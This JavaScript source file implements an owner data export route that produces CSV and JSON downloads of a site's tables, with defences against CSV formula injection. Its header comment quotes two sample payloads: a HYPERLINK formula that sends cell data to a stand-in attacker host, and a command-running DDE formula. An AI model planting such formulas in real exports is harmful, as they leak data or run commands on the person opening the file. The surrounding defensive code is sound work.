// The owner taking their data out.
//
// The Backups panel has had a working download button since the D1 era, wired
// to `/api/site/backend/export` — a route deleted on 2026-07-27. So a barber
// shop's bookings could be read on screen and never got out of the building.
//
// The interesting part of a CSV export is not the commas.
//
// ── CSV injection ───────────────────────────────────────────────────────────
// A `collect` table is, by definition, text a stranger typed into a form. Excel,
// LibreOffice and Google Sheets all treat a cell beginning `=`, `+`, `-` or `@`
// as a FORMULA and evaluate it on open. So a booking whose "notes" say
//
//     =HYPERLINK("https://evil.example/?"&A1,"Click for your receipt")
//
// becomes a live link built out of the neighbouring cell the moment the owner
// opens the file — and `=cmd|'/c calc'!A1` is worse. The person attacked is the
// owner, by their own spreadsheet, using data our API handed them.
//
// Quoting does NOT fix this: the quotes are stripped by the CSV parser before
// the formula parser ever sees the cell. The value has to stop being a formula.

const json = (body, status = 200) => ({ status, body });

/** Rows per export. High enough to be a real backup, bounded so one call cannot exhaust the isolate. */
export const MAX_EXPORT_ROWS = 10000;

const DANGEROUS = /^[=+@\t\r]/;

/**
 * One CSV cell: quoted where it must be, and never a formula.
 *
 * The leading `'` is what Excel and Sheets read as "this is text". It is
 * applied narrowly on purpose:
 *
 * `-` is in the trigger set for a real reason (`-1+1` evaluates) but it is also
 * how every negative number and plenty of dates begin, and prefixing those would
 * corrupt ordinary data in the common case to defend against the rare one. So a
 * value that is simply a number is left alone, and anything else that starts
 * dangerously is neutralised.
 */
export function csvCell(v) {
  if (v === null || v === undefined) return "";
  let s = typeof v === "object" ? JSON.stringify(v) : String(v);
  const isPlainNumber = /^-?\d+(\.\d+)?$/.test(s);
  if (!isPlainNumber && (DANGEROUS.test(s) || s.startsWith("-"))) s = "'" + s;
  // Quote when the value contains anything the CSV grammar cares about. A quote
  // inside a quoted field is doubled — that is the escape, not a backslash.
  if (/[",\n\r]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
  return s;
}

/** \r\n line endings: Excel is the consumer, and it is what RFC 4180 says. */
export function toCsv(cols, rows) {
  const head = cols.map(csvCell).join(",");
  const body = rows.map((r) => cols.map((c) => csvCell(r ? r[c] : "")).join(","));
  return [head].concat(body).join("\r\n") + "\r\n";
}

/**
 * Which columns an export shows, in a stable order.
 *
 * `id` and `created_at` lead because a spreadsheet of bookings is useless
 * without "which one" and "when". `_fts` is the search index, not data, and is
 * dropped the same way every other read drops it.
 */
export function exportColumns(def, rows) {
  const declared = (Array.isArray(def.columns) ? def.columns : [])
    .map((c) => String(typeof c === "string" ? c : (c && c.name) || ""))
    .filter(Boolean);
  const seen = new Set(["_fts"]);
  const out = [];
  for (const c of ["id", "created_at"].concat(declared)) {
    if (!seen.has(c)) { seen.add(c); out.push(c); }
  }
  // Anything the table really has that the schema did not name — an engine
  // column like `position`, or a column added by a later apply. An export that
  // silently drops a column is not a backup.
  for (const r of rows.slice(0, 50)) {
    for (const k of Object.keys(r || {})) if (!seen.has(k)) { seen.add(k); out.push(k); }
  }
  return out;
}

/**
 * deps:
 *   gate(slug, uid)          → {error} | {}
 *   dbFor(slug)              → conn | null
 *   loadSchema(conn)         → {tables}
 *   query(conn, sql, args)   → rows
 *   ident(name)              → quoted identifier
 */
export async function handleOwnerExport(deps, { slug, uid, table, format } = {}) {
  const gate = await deps.gate(slug, uid);
  if (gate.error) return gate.error;

  const db = await deps.dbFor(slug);
  if (!db) return json({ error: "no such site" }, 404);

  const spec = await deps.loadSchema(db);
  const def = (spec && Array.isArray(spec.tables) ? spec.tables : [])
    .find((t) => t && String(t.name).toLowerCase() === String(table || "").toLowerCase());
  // The name reaches SQL. Allow-listed against what the site declared, exactly
  // as the on-screen read is.
  if (!def) return json({ error: "no such table" }, 404);

  const rows = await deps.query(
    db,
    `SELECT * FROM ${deps.ident(def.name)} ORDER BY ${deps.ident("id")} ASC LIMIT ?`,
    [MAX_EXPORT_ROWS],
  );
  for (const r of rows) if (r && r._fts !== undefined) delete r._fts;

  const name = String(slug).toLowerCase() + "-" + String(def.name).toLowerCase();
  if (String(format || "csv").toLowerCase() === "json") {
    return {
      status: 200,
      body: JSON.stringify({ table: def.name, rows }, null, 2),
      headers: {
        "content-type": "application/json; charset=utf-8",
        "content-disposition": `attachment; filename="${name}.json"`,
      },
      raw: true,
    };
  }

  const cols = exportColumns(def, rows);
  return {
    status: 200,
    body: toCsv(cols, rows),
    headers: {
      "content-type": "text/csv; charset=utf-8",
      // `attachment` matters beyond convenience: it stops a browser rendering
      // owner-supplied text as a document on our own origin.
      "content-disposition": `attachment; filename="${name}.csv"`,
    },
    raw: true,
  };
}
